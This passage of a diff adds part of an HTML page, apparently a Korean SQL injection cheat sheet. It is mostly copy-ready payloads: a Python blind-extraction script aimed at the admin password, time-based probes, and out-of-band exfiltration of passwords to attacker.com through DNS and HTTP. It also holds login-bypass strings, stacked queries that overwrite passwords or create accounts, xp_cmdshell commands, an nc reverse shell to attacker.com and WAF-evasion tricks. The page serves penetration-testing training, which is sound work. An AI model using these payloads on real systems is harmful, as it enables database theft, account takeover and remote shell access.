+          <tr><th>항목</th><th>MySQL</th><th>MSSQL</th><th>PostgreSQL</th><th>Oracle</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="pri">CASE WHEN 표현식 사용</td><td class="tag-green">가능</td><td class="tag-green">가능</td><td class="tag-green">가능</td><td class="tag-green">가능</td></tr>
+          <tr><td class="pri">위치 번호 지정 (<code>ORDER BY 1</code>)</td><td class="tag-green">가능</td><td class="tag-green">가능</td><td class="tag-green">가능</td><td class="tag-green">가능</td></tr>
+          <tr><td class="pri">콤마로 다중 정렬 키 추가</td><td class="tag-green">가능</td><td class="tag-green">가능</td><td class="tag-green">가능</td><td class="tag-green">가능</td></tr>
+          <tr><td class="pri">Time delay를 표현식 자리에 직접 사용</td><td class="tag-green"><code>SLEEP()</code> 함수라 가능</td><td class="tag-red"><code>WAITFOR</code>는 문(statement)이라 불가능 — Stacked Query(10번) 필요</td><td class="tag-green"><code>pg_sleep()</code> 함수라 가능</td><td class="tag-green"><code>DBMS_PIPE.RECEIVE_MESSAGE()</code> 함수라 가능</td></tr>
+          <tr><td class="pri">조건-거짓 시 에러 메시지</td><td><code>Subquery returns more than 1 row</code></td><td><code>Subquery returned more than 1 value</code></td><td><code>more than one row returned by a subquery used as an expression</code></td><td><code>ORA-01427: single-row subquery returns more than one row</code></td></tr>
+        </tbody>
+      </table>
+      <div class="tip-box" style="margin-top:10px;">
+        <span class="box-icon">💡</span>
+        MSSQL 대상일 때는 Time-Based를 ORDER BY 자리에서 바로 못 쓴다는 점을 기억할 것 — Stacked Query가 막혀 있다면 6.4/6.5의 에러 유발형(①②) 방식으로 전환.
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">6.7 LIMIT / OFFSET (페이지네이션) 파라미터 특징</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        <code>?page=2&size=20</code> 류의 페이지네이션 파라미터도 흔한 입력 포인트지만, <strong>DB마다 문법 자체가 다르게 제약</strong>되어 있어 sort/order와는 접근이 달라진다.
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- MySQL / MSSQL(TOP)/ Oracle(ROWNUM 서브쿼리): LIMIT/OFFSET/TOP 자리는 정수 리터럴만 허용 — CASE WHEN, 서브쿼리 삽입 불가
+--   → 이 파라미터 자체는 그냥 "숫자형 파라미터"(01번 섹션)로 취급해서
+--     뒤에 UNION이나 주석을 붙이는 일반적인 방식으로 접근하는 게 낫다
+?limit=10 UNION SELECT username,password FROM users-- -
+?limit=1;--   -- 숫자 뒤에 세미콜론/주석이 그대로 실행되는지 확인 (따옴표 처리 없이 숫자만 검증하는 경우 흔함)
+
+-- PostgreSQL: LIMIT/OFFSET에 "임의의 표현식" 허용 (표준을 따름) → CASE WHEN 기반 Blind를 그대로 사용 가능
+1' LIMIT (CASE WHEN (1=1) THEN 10 ELSE (SELECT 1 UNION SELECT 2) END)--   -- 참: 정상
+1' LIMIT (CASE WHEN (1=2) THEN 10 ELSE (SELECT 1 UNION SELECT 2) END)--   -- 거짓: 에러
+1' OFFSET (CASE WHEN (substring(database(),1,1)='d') THEN 0 ELSE (SELECT 1 UNION SELECT 2) END)--</code></pre>
+      </div>
+      <div class="info-box">
+        <span class="box-icon">ℹ</span>
+        <div>PostgreSQL만 표현식을 허용한다는 점을 역이용하면, <code>LIMIT (CASE WHEN ...)</code> 삽입이 에러 없이 성공하는 것 자체가 "PostgreSQL이구나"를 알려주는 3번 섹션급 핑거프린팅 단서가 된다.</div>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">6.8 sqlmap이 막힐 때 — 수동 자동화 스크립트 (Python)</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        WAF가 sqlmap 특유의 User-Agent/패턴을 차단하거나, 로그인 세션·커스텀 헤더가 필요해 sqlmap 설정이 번거로울 때 직접 스크립트를 짜는 감각도 필요하다.
+        아래는 6.2의 "이진 탐색" 원리를 그대로 코드로 옮긴 최소 예시.
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-python">import requests
+import time
+
+URL = "http://target.com/items"
+TRUE_MARKER = "Welcome"   # 참일 때만 응답에 나타나는 문자열 (2.5절 참고 — 응답 길이 비교로 대체 가능)
+
+def is_true(condition_sql):
+    payload = f"1' AND ({condition_sql})--"
+    r = requests.get(URL, params={"id": payload}, timeout=10)
+    time.sleep(0.2)  # 서버 부하 방지 — 실전에서는 반드시 딜레이를 둘 것
+    return TRUE_MARKER in r.text
+
+def get_length(subquery):
+    lo, hi = 0, 200
+    while lo < hi:
+        mid = (lo + hi) // 2
+        if is_true(f"length(({subquery}))>{mid}"):
+            lo = mid + 1
+        else:
+            hi = mid
+    return lo
+
+def extract_char(subquery, pos):
+    lo, hi = 32, 126   # 출력 가능 ASCII 범위
+    while lo < hi:
+        mid = (lo + hi) // 2
+        if is_true(f"ascii(substring(({subquery}),{pos},1))>{mid}"):
+            lo = mid + 1
+        else:
+            hi = mid
+    return chr(lo)
+
+def extract(subquery):
+    length = get_length(subquery)
+    print(f"[+] 길이: {length}")
+    result = ""
+    for i in range(1, length + 1):
+        result += extract_char(subquery, i)
+        print(f"\r[+] 진행: {result}", end="", flush=True)
+    print()
+    return result
+
+if __name__ == "__main__":
+    extract("SELECT password FROM users WHERE username='admin'")</code></pre>
+      </div>
+      <div class="warn-box">
+        <span class="box-icon">⚠</span>
+        <div>실전 적용 시 반드시 요청 간 딜레이/타임아웃/재시도 로직을 넣을 것. 스레드로 병렬화하면 빨라지지만 대상 서버에 부하를 줄 수 있으므로 <strong>허가받은 범위와 속도 제한을 반드시 사전 협의</strong>할 것.</div>
+      </div>
+    </div>
+
+    <div class="tip-box">
+      <span class="box-icon">💡</span>
+      실전에서는 sqlmap(<code>--technique=E</code> 등으로 에러기반 지정 가능) 또는 자체 Python 스크립트로 자동화하는 것이 일반적. 수동으로는 한 글자당 최대 수십 번의 요청이 필요.
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       07. Time-Based Blind SQLi
+       ============================================================ -->
+  <section class="section-block" id="s-time">
+    <div class="section-header">
+      <span class="section-num">07</span>
+      <h2 class="section-title">Time-Based Blind SQLi</h2>
+      <span class="section-badge badge-green">Blind</span>
+    </div>
+    <div class="section-desc">
+      <strong>언제 사용</strong>: 화면 반응 차이가 전혀 없을 때<br>
+      조건이 참이면 SLEEP → 응답 지연, 거짓이면 즉시 응답. 응답 시간 자체가 유일한 정보 채널.
+    </div>
+
+    <div class="db-grid">
+      <div class="db-col">
+        <div class="db-head mysql">MySQL</div>
+        <div class="db-body">
+          <div class="db-label">기본 지연</div>
+          <div class="db-item">SELECT SLEEP(5)</div>
+          <div class="db-item">BENCHMARK(5000000, MD5('a'))</div>
+          <div class="db-label">조건부 지연</div>
+          <div class="db-item">IF([조건],SLEEP(5),0)</div>
+          <div class="db-label">예시</div>
+          <div class="db-item" style="font-size:10.5px; word-break:break-all;">1' AND IF(substring(database(),1,1)='d',SLEEP(5),0)--</div>
+        </div>
+      </div>
+      <div class="db-col">
+        <div class="db-head mssql">MSSQL</div>
+        <div class="db-body">
+          <div class="db-label">기본 지연</div>
+          <div class="db-item">WAITFOR DELAY '0:0:5'</div>
+          <div class="db-label">조건부 지연</div>
+          <div class="db-item">IF ([조건]) WAITFOR DELAY '0:0:5'</div>
+          <div class="db-label">예시</div>
+          <div class="db-item" style="font-size:10.5px; word-break:break-all;">1'; IF (substring(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--</div>
+        </div>
+      </div>
+      <div class="db-col">
+        <div class="db-head pgsql">PostgreSQL</div>
+        <div class="db-body">
+          <div class="db-label">기본 지연</div>
+          <div class="db-item">SELECT pg_sleep(5)</div>
+          <div class="db-label">조건부 지연</div>
+          <div class="db-item" style="font-size:10.5px;">CASE WHEN ([조건]) THEN pg_sleep(5) ELSE pg_sleep(0) END</div>
+          <div class="db-label">pg_sleep 차단 시</div>
+          <div class="db-item" style="font-size:10.5px; word-break:break-all;">SELECT count(*) FROM generate_series(1,10000000)</div>
+        </div>
+      </div>
+      <div class="db-col">
+        <div class="db-head oracle">Oracle</div>
+        <div class="db-body">
+          <div class="db-label">기본 지연</div>
+          <div class="db-item" style="font-size:10.5px;">DBMS_PIPE.RECEIVE_MESSAGE('a',5)</div>
+          <div class="db-label">조건부 지연</div>
+          <div class="db-item" style="font-size:10.5px; word-break:break-all;">CASE WHEN ([조건]) THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="sub-section" style="margin-top:16px;">
+      <div class="sub-title">7.1 실전 페이로드 예시 (MySQL)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 취약점 확인 (5초 지연 발생하면 SQLi 가능)
+1' AND SLEEP(5)--
+
+-- DB 이름 길이 파악
+1' AND IF(length(database())=4,SLEEP(5),0)--
+
+-- DB 이름 한 글자씩
+1' AND IF(substring(database(),1,1)='d',SLEEP(5),0)--
+
+-- 비밀번호 추출
+1' AND IF(substring((SELECT password FROM users WHERE username='admin'),1,1)='5',SLEEP(5),0)--
+
+-- SLEEP 차단 시 대안
+1' AND IF(1=1,BENCHMARK(5000000,MD5('a')),0)--</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       08. Out-of-Band (OOB) SQLi
+       ============================================================ -->
+  <section class="section-block" id="s-oob">
+    <div class="section-header">
+      <span class="section-num">08</span>
+      <h2 class="section-title">Out-of-Band (OOB) SQLi</h2>
+      <span class="section-badge badge-purple">OOB</span>
+    </div>
+    <div class="section-desc">
+      <strong>언제 사용</strong>: 화면 출력도 없고 반응 차이도 없을 때<br>
+      DB 서버가 직접 외부 서버로 DNS/HTTP 요청을 보내 데이터를 유출. <strong>Burp Collaborator, interactsh</strong> 등 OOB 서버 필요.
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">8.1 MySQL — DNS 조회 (Windows 전용, FILE 권한 필요)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 기본 DNS 조회 유발
+LOAD_FILE(CONCAT('\\\\', database(), '.attacker.com\\a'))
+
+-- 비밀번호 → DNS 서브도메인으로 유출
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))</code></pre>
+      </div>
+      <div class="warn-box" style="margin-top:8px;">
+        <span class="box-icon">⚠</span>
+        <div>MySQL 5.5.53 / 5.6.34 / 5.7.16 이후 기본값으로 <code>secure_file_priv</code>가 특정 디렉토리로 제한되거나 <code>NULL</code>(완전 비활성)로 설정되어
+        <code>LOAD_FILE</code>이 대부분 막혀 있다. 시도 전 <code>SELECT @@secure_file_priv</code>로 먼저 확인할 것.</div>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">8.2 MSSQL — xp_dirtree DNS 유출</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 기본 DNS 조회
+EXEC master..xp_dirtree '//attacker.com/a'
+
+-- 데이터 포함 DNS 유출
+DECLARE @data varchar(1024);
+SET @data = (SELECT TOP 1 password FROM users);
+EXEC('master..xp_dirtree "//' + @data + '.attacker.com/a"')
+
+-- xp_fileexist 대안
+EXEC xp_fileexist '\\attacker.com\a'</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">8.3 PostgreSQL — COPY/dblink</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- COPY to program (OS 명령 실행, DBA 권한 필요)
+COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'
+
+-- dblink로 외부 서버 연결 (dblink 설치 시)
+SELECT * FROM dblink('host=attacker.com user=a dbname=a', 'SELECT 1') AS t(a int)</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">8.4 Oracle — UTL_HTTP / UTL_INADDR</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- HTTP 요청으로 데이터 유출
+SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual
+
+-- DNS 조회로 데이터 유출
+SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') FROM dual</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">8.5 OOB 서버 실전 사용법 — Burp Collaborator / interactsh</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        위 페이로드들의 <code>attacker.com</code>은 실제로는 상호작용을 "감지"할 수 있는 서버여야 한다. 아래 두 도구가 실전에서 가장 많이 쓰인다.
+      </div>
+      <div class="step-list">
+        <div class="step-item">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-title">고유 도메인 발급</div>
+            <div class="step-desc"><strong>Burp Collaborator</strong>: Burp의 Repeater/Intruder에서 우클릭 → "Insert Collaborator payload" (또는 Burp 메뉴 → Collaborator client 실행)<br>
+            <strong>interactsh</strong>(오픈소스, Burp 라이선스 불필요): 터미널에서 <code>interactsh-client</code> 실행 → 고유 서브도메인 발급(예: <code>abc123.oast.fun</code>)</div>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-title">발급받은 도메인을 페이로드에 삽입</div>
+            <div class="step-desc">8.1~8.4의 <code>attacker.com</code> 자리를 발급받은 도메인으로 교체 후 요청 전송</div>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-title">상호작용(interaction) 확인</div>
+            <div class="step-desc">Burp Collaborator client의 "Poll now" 클릭, 또는 interactsh-client 터미널에 실시간으로 찍히는 DNS/HTTP 로그 확인. 상호작용이 찍히면 SQLi 확정.</div>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">4</div>
+          <div class="step-body">
+            <div class="step-title">데이터까지 함께 유출 (탐지를 넘어 추출로)</div>
+            <div class="step-desc">유출할 값을 서브도메인 자리에 실어 보내면, 로그에 찍히는 서브도메인 문자열 자체가 결과값이 된다.</div>
+          </div>
+        </div>
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- MySQL 예시: 비밀번호 앞 8자리를 서브도메인에 실어 DNS로 유출
+SELECT LOAD_FILE(CONCAT('\\\\',(SELECT SUBSTRING(password,1,8) FROM users LIMIT 1),'.abc123.oast.fun\\a'))
+-- → interactsh 로그에 "5f4dcc3b.abc123.oast.fun" 형태의 DNS 쿼리가 찍히면 그 자체가 해시 앞부분</code></pre>
+      </div>
+      <div class="warn-box">
+        <span class="box-icon">⚠</span>
+        <div>DNS 서브도메인은 라벨당 63자, 전체 253자 제한이 있고 <code>_ + . / \</code> 등 특수문자가 깨질 수 있음 — 긴 값은 여러 번에 나눠 유출하거나 HTTP 기반 OOB(UTL_HTTP 등)로 전환할 것.</div>
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       09. 인증 우회 (Auth Bypass)
+       ============================================================ -->
+  <section class="section-block" id="s-auth">
+    <div class="section-header">
+      <span class="section-num">09</span>
+      <h2 class="section-title">인증 우회 (Login Bypass)</h2>
+      <span class="section-badge badge-red">Auth</span>
+    </div>
+    <div class="section-desc">
+      <strong>언제 사용</strong>: 로그인 폼의 username/password 필드에 SQLi 가능할 때<br>
+      SQL 쿼리의 WHERE 조건을 무력화하거나 항상 참으로 만들어 비밀번호 없이 로그인.
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">9.1 주석으로 password 체크 무력화</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- username 필드에 입력 (password는 아무거나)
+admin'--
+admin'#
+admin'/*
+admin' OR '1'='1'--
+admin'--+
+
+-- 실행되는 쿼리 변환
+-- 원래: SELECT * FROM users WHERE username='admin' AND password='입력'
+-- 변환: SELECT * FROM users WHERE username='admin'--' AND password='아무거나'
+--       → password 체크가 주석처리되어 admin으로 로그인 성공</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">9.2 OR 조건으로 항상 참 만들기</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- username 필드에 입력 (모두 첫 번째 행=보통 admin으로 로그인)
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR 1=1--
+') OR ('1'='1
+' OR 1=1 OR ''='
+'OR 'unusual'='unusual
+
+-- password 필드에도 사용 가능
+anything' OR 'x'='x</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">9.3 쿼리 변환 시뮬레이션</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 원래 로그인 쿼리
+SELECT * FROM users WHERE username='[입력]' AND password='[입력]'
+
+-- admin'-- 입력 후
+SELECT * FROM users WHERE username='admin'--' AND password='anything'
+-- → admin 계정으로 비밀번호 없이 로그인
+
+-- ' OR '1'='1'-- 입력 후
+SELECT * FROM users WHERE username='' OR '1'='1'--' AND password='...'
+-- → '1'='1' 항상 참 → 첫 번째 행(보통 admin)으로 로그인
+
+-- UNION으로 가짜 행 삽입 (해시 우회)
+' UNION SELECT 1,'admin','5f4dcc3b5aa765d61d8327deb882cf99'--
+-- 앱이 UNION 결과를 실제 계정으로 처리하면 'password' 해시로 로그인 가능</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       10. Stacked Queries
+       ============================================================ -->
+  <section class="section-block" id="s-stacked">
+    <div class="section-header">
+      <span class="section-num">10</span>
+      <h2 class="section-title">Stacked Queries (쿼리 중첩)</h2>
+      <span class="section-badge badge-purple">고급</span>
+    </div>
+    <div class="section-desc">
+      <strong>언제 사용</strong>: 세미콜론(;)으로 추가 쿼리를 실행할 수 있을 때<br>
+      두 번째 쿼리 결과는 화면에 출력되지 않아 Blind 기법과 함께 사용. Oracle은 미지원.
+    </div>
+
+    <div class="warn-box">
+      <span class="box-icon">⚠</span>
+      MySQL은 PDO 멀티쿼리 설정에서만 지원. MSSQL/PostgreSQL이 주 대상. Oracle 미지원.
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">10.1 실행 가능 여부 확인</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- Time delay로 실행 확인
+1'; SELECT SLEEP(5)--           -- MySQL (일부)
+1'; WAITFOR DELAY '0:0:5'--    -- MSSQL
+1'; SELECT pg_sleep(5)--       -- PostgreSQL</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">10.2 데이터 변조 공격</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 비밀번호 변경
+1'; UPDATE users SET password='hacked' WHERE username='admin'--
+
+-- 새 계정 생성
+1'; INSERT INTO users(username,password) VALUES('hacker','hacked')--
+
+-- 데이터 삭제 (복구 불가 — 인가 범위 외 사용 절대 금지)
+-- 1'; DROP TABLE users--</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">10.3 MSSQL — OS 명령 실행 (xp_cmdshell)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- xp_cmdshell 활성화 (기본 비활성 상태)
+1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
+1'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+
+-- OS 명령 실행
+1'; EXEC xp_cmdshell 'whoami'--
+1'; EXEC xp_cmdshell 'net user'--
+1'; EXEC xp_cmdshell 'ipconfig'--
+
+-- 결과를 테이블에 저장 후 UNION으로 읽기
+CREATE TABLE cmd_out(output varchar(8000));
+INSERT INTO cmd_out EXEC xp_cmdshell 'whoami';
+SELECT output FROM cmd_out;</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">10.4 PostgreSQL — COPY TO PROGRAM</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- OS 명령 실행 (DBA 권한 필요)
+1'; COPY (SELECT '') TO PROGRAM 'bash -c "id > /tmp/pwned"'--
+1'; COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash attacker.com 4444'--</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       11. Second-Order SQLi
+       ============================================================ -->
+  <section class="section-block" id="s-second">
+    <div class="section-header">
+      <span class="section-num">11</span>
+      <h2 class="section-title">Second-Order SQLi (저장형)</h2>
+      <span class="section-badge badge-purple">고급</span>
+    </div>
+    <div class="section-desc">
+      <strong>언제 발생</strong>: 입력값이 DB에 저장된 후 나중에 다른 기능에서 쿼리에 사용될 때<br>
+      기본 스캔으로는 잡히지 않음 — 저장 지점과 실행 지점이 다른 요청(URL)이라 자동 스캐너가 인과관계를 못 잡기 때문. 기능 간 데이터 흐름을 수동으로 먼저 추적해야 함.
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">11.1 공격 흐름</div>
+      <div class="step-list">
+        <div class="step-item">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-title">회원가입: username에 <code>admin'--</code> 입력</div>
+            <div class="step-desc">이 시점에는 이스케이프 처리되어 DB에 <code>admin'--</code> 문자열 그대로 저장 (에러 없음)</div>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-title">비밀번호 변경 기능 실행</div>
+            <div class="step-desc">서버가 DB에서 username을 꺼내 쿼리에 그대로 삽입:</div>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-title">쿼리 변환 결과</div>
+            <div class="step-desc"><code>UPDATE users SET password='new' WHERE username='admin'--'</code><br>→ 주석처리로 admin 비밀번호 변경됨!</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">11.2 대표 테스트 페이로드</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 저장 단계 (회원가입 / 프로필 수정)
+admin'--
+admin' OR '1'='1'--
+test' AND (SELECT SLEEP(5))--   -- Time-based 확인
+
+-- 탐지 방법:
+-- 1. 입력 저장 기능 식별 (회원가입, 프로필 수정, 설정 저장 등)
+-- 2. 저장값이 쿼리에 사용되는 기능 식별 (비밀번호 변경, 관리자 조회 등)
+-- 3. 저장 단계에서 페이로드 삽입
+-- 4. 사용 단계 실행 후 비정상 동작 확인</code></pre>
+      </div>
+    </div>
+
+    <div class="tip-box">
+      <span class="box-icon">💡</span>
+      sqlmap은 <code>--second-url="URL"</code> 옵션으로 "페이로드를 넣는 URL"과 "결과를 확인할 URL"을 분리 지정할 수 있어 단순한 1-홉 Second-Order는 자동화 가능하다 (전체 요청을 지정하려면 <code>--second-req=FILE</code>).
+      다만 회원가입→로그인→마이페이지처럼 <strong>3단계 이상 여러 세션·역할을 거치는 흐름</strong>은 여전히 수동 추적이 필요.
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       12. WAF 우회 기법
+       ============================================================ -->
+  <section class="section-block" id="s-waf">
+    <div class="section-header">
+      <span class="section-num">12</span>
+      <h2 class="section-title">WAF 우회 기법</h2>
+      <span class="section-badge badge-orange">우회</span>
+    </div>
+    <div class="section-desc">
+      WAF(Web Application Firewall)가 키워드/패턴 기반으로 차단할 때 사용하는 우회 기법들.
+      여러 기법을 조합하면 더 효과적.
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">12.0 우회 전에 — WAF 벤더부터 식별</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        벤더마다 막는 패턴/우회 난이도가 다르다. 무작정 우회 기법을 시도하기 전에 <strong>어떤 WAF인지</strong>부터 확인하면 시행착오를 크게 줄일 수 있다 — "감각"은 결국 여기서 갈린다.
+      </div>
+      <table class="compare-table">
+        <thead>
+          <tr><th>WAF</th><th>식별 단서</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="pri">Cloudflare</td><td>응답 헤더 <code>cf-ray</code>, <code>cf-cache-status</code>; 차단 시 특유의 "Attention Required!" challenge 페이지</td></tr>
+          <tr><td class="pri">AWS WAF</td><td>차단 시 <code>x-amzn-RequestId</code> 헤더 + 일반적인 403 텍스트("Request blocked" 등, 커스터마이즈 가능)</td></tr>
+          <tr><td class="pri">F5 BIG-IP ASM</td><td>쿠키 이름이 <code>TS</code>로 시작(<code>TS0123abcd=...</code>), 차단 페이지에 "The requested URL was rejected" 문구</td></tr>
+          <tr><td class="pri">Imperva Incapsula</td><td>쿠키 <code>incap_ses_*</code>, <code>visid_incap_*</code></td></tr>
+          <tr><td class="pri">Akamai</td><td>헤더 <code>akamai-x-cache</code> 등 (환경별로 다름), CDN 자체에서 1차 차단되는 경우 많음</td></tr>
+          <tr><td class="pri">ModSecurity (OWASP CRS)</td><td>기본 룰셋의 403 응답에 "Mod_Security" 관련 문구가 남아있는 경우가 종종 있음(설정에 따라 다름)</td></tr>
+        </tbody>
+      </table>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-bash"># sqlmap으로 WAF/IPS 자동 식별
+sqlmap -u "http://target.com/?id=1" --identify-waf
+
+# 응답 헤더/쿠키 직접 확인 (curl)
+curl -sI "http://target.com/?id=1'"</code></pre>
+      </div>
+      <div class="tip-box">
+        <span class="box-icon">💡</span>
+        벤더를 알면 그 벤더의 우회 기법을 검색해서 12.1~12.7보다 훨씬 정확한 우회를 시도할 수 있다 (예: Cloudflare는 인코딩 우회에, ModSecurity CRS는 특정 룰 ID 우회에 강점이 있음).
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">12.1 공백 대체</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- C-style 주석으로 공백 대체 (MySQL/PostgreSQL 모두 적용)
+SELECT/**/username/**/FROM/**/users
+UNION/**/SELECT/**/NULL/**/FROM/**/users
+
+-- 탭(\t) URL 인코딩
+SELECT%09username%09FROM%09users
+
+-- 줄바꿈 URL 인코딩
+SELECT%0Ausername%0AFROM%0Ausers
+
+-- 괄호로 공백 완전 제거
+UNION(SELECT(username),(password)FROM(users))</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">12.2 대소문자 혼용</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">SeLeCt UsErNaMe FrOm UsErS
+uNiOn SeLeCt NuLl,NuLl--
+UnIoN aLl SeLeCt</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">12.3 인코딩 우회</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- URL 인코딩
+%27                -- ' (단일 인코딩)
+%2527              -- ' (이중 인코딩 — WAF가 한 번만 디코딩할 때)
+%22                -- "
+
+-- 16진수로 따옴표 없이 문자열 표현 (MySQL)
+SELECT 0x61646d696e               -- 'admin'
+WHERE username=0x61646d696e
+
+-- CHAR 함수로 문자열 (모든 DB)
+SELECT CHAR(97,100,109,105,110)   -- 'admin' (MySQL)
+SELECT CHAR(0x41)+CHAR(0x42)      -- 'AB' (MSSQL)
+SELECT CHR(65)||CHR(66)           -- 'AB' (PostgreSQL/Oracle)</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">12.4 키워드 우회</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 필터가 SELECT를 한 번만 제거할 때 (중복 삽입)
+SESELECTLECT       -- 필터 제거 후 SELECT 남음
+UNUNIONION SELSELECTECT
+
+-- 주석 삽입으로 키워드 분리
+UN/**/ION SEL/**/ECT
+UN--\nION SEL--\nECT
+
+-- MySQL 버전 조건부 주석 (버전 무관 실행)
+/*!UNION*/ /*!SELECT*/ 1,2,3
+/*!50000 UNION*/ /*!50000 SELECT*/
+
+-- 대안 함수 사용
+MID()        대신  SUBSTRING()
+SUBSTR()     대신  MID()
+IF(a,b,c)    대신  CASE WHEN a THEN b ELSE c END
+SLEEP()      대신  BENCHMARK()</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">12.5 XML/JSON 입력 경로 우회 (2025년 실전 확인)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-xml">&lt;!-- XML 이스케이프로 키워드 우회 --&gt;
+&lt;storeId&gt;999 &amp;#x53;ELECT * FROM information_schema.tables&lt;/storeId&gt;
+&lt;!-- &#x53; = S → 서버가 디코딩 후 DB로 전달 → WAF는 SELECT 패턴 못 잡음 --&gt;</code></pre>
+      </div>
+      <div class="code-wrap">
